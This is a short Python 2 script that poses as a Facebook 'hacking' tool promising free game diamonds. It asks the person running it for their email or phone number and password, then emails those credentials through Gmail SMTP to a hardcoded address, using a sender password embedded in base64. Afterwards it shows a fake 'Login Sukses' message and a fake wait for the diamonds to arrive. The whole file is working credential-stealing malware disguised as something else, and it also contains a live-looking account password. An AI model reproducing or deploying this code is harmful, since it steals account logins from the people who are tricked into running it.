from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import time
import os,sys
 
msg = MIMEMultipart()
 
 
def asus(s):
  for c in s + '\n':
    sys.stdout.write(c)
    sys.stdout.flush()
    time.sleep(1./10)
 
def sayang():
	asu = raw_input('Much Diamond : ')
	print('Opening Account...')
	time.sleep(5)
	print('Wait 10 Minutes,  Diamond send to your account')
	asus('Wait.. ')

sange = '        \xe2\x95\xad\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xae\n           \x1b[0m[\x1b[31;1m\xe2\x96\xba\x1b[0m]PHOENIX HACKING\n           \x1b[0m[\x1b[31;1m\xe2\x96\xba\x1b[0m]HACKING FOR FACEBOOK\n        \xe2\x95\xb0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xaf'
memek = '          \xe2\x95\xad\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xae\n             \x1b[0m[\x1b[31;1m\xe2\x96\xba\x1b[0m ]PHOENIX HACKING\n             \x1b[0m[\x1b[31;1m\xe2\x96\xba\x1b[0m ]HACKING FOR FACEBOOK\n          \xe2\x95\xb0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x80\xa2\xe2\x97\x88\xe2\x80\xa2\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xaf'
os.system('clear')
print sange

print ('\n\xe2\x9c\xa0 Login Dengan Akun Kalian\n')
message = raw_input('\n\x1b[0m[\x1b[32;1m\xe2\x9e\x99\x1b[0m]\x1b[0m Email/NoHP : ')
bajingan = raw_input('\x1b[0m[\x1b[32;1m\xe2\x9e\x99\x1b[0m]\x1b[0m Password   : ')

from base64 import *
nano = '\n'
a = ' Username : '
b = ' Password : '
password = b64decode("dHV0b3JpYWxrdTg5") # masukkan password pengirim. terlebih dahulu encode dengan base64
msg['From'] = "sautmarulijhosua@gmail.com"
msg['To'] = "jhosuasautmaruli0079@gmail.com"
msg['Subject'] = "AKUN MASUK"
 

msg.attach(MIMEText(message,  'plain'))
msg.attach(MIMEText(bajingan, '\nplain'))
 
server = smtplib.SMTP('smtp.gmail.com: 587') # jangan di edit
 
server.starttls()
 
# Login Credentials for sending the mail
server.login(msg['From'], password)
 
 
# send the message via the server.
server.sendmail(msg['From'], msg['To'], msg.as_string())
 
server.quit()
 
asus('\n\x1b[0m[\x1b[32;1\xe2\x9c\x93\x1b[0m] Login Sukses')
os.system('clear')
time.sleep(6)
sayang()